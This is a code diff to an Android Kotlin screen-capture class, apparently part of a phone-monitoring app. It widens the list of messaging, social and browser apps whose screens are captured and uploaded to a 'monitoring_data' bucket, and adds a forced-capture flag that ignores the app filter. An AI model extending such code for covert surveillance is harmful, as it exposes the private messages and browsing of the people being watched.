@@ -28,25 +28,36 @@ class ScreenCaptureEngine(private val context: Context) {
 
     companion object {
         private const val TAG = "ScreenCaptureEngine"
-        private const val BUCKET_NAME = "screenshots"
+        private const val BUCKET_NAME = "monitoring_data"
         private val TARGET_APPS = listOf(
             "com.whatsapp",
             "com.facebook.orca", // Messenger
             "com.instagram.android",
             "com.snapchat.android",
             "com.twitter.android",
-            "com.google.android.youtube"
+            "com.google.android.youtube",
+            "com.zhiliaoapp.musically", // TikTok
+            "org.telegram.messenger",
+            "com.android.chrome",
+            "com.facebook.katana" // Facebook App
         )
     }
 
     /**
      * تنفيذ عملية الالتقاط والرفع
      */
-    suspend fun captureAndUpload(projection: MediaProjection) = withContext(Dispatchers.IO) {
-        val currentApp = getForegroundApp()
-        
-        if (currentApp != null && !TARGET_APPS.contains(currentApp)) {
-            Log.d(TAG, "Skipping capture: foreground app ($currentApp) is not targeted.")
+    suspend fun captureAndUpload(projection: MediaProjection, forceCapture: Boolean = false) = withContext(Dispatchers.IO) {
+        // 1. التحقق من حالة الشاشة لتوفير البطارية (لا نصور والشاشة مغلقة)
+        val powerManager = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+        if (!powerManager.isInteractive) {
+            Log.d(TAG, "Screen is OFF. Skipping capture to save battery.")
+            return@withContext
+        }
+
+        // 2. التحقق من التطبيق المستهدف
+        val currentApp = if (!forceCapture) getForegroundApp() else null
+        if (!forceCapture && (currentApp == null || !TARGET_APPS.contains(currentApp))) {
+            Log.d(TAG, "Skipping capture: foreground app ($currentApp) is not in target list.")
             return@withContext
         }
 
@@ -75,10 +86,14 @@ class ScreenCaptureEngine(private val context: Context) {
                     imageReader.surface, null, null
                 )
 
-                // انتظار برهة لبدء العرض
-                kotlinx.coroutines.delay(1000L)
+                // المحاولة عدة مرات لالتقاط صورة صحيحة
+                var image: android.media.Image? = null
+                for (retry in 1..10) {
+                    image = imageReader.acquireLatestImage()
+                    if (image != null) break
+                    kotlinx.coroutines.delay(200L) // انتظار 200 مللي ثانية بين المحاولات
+                }
 
-                val image = imageReader.acquireLatestImage()
                 if (image != null) {
                     try {
                         val planes = image.planes
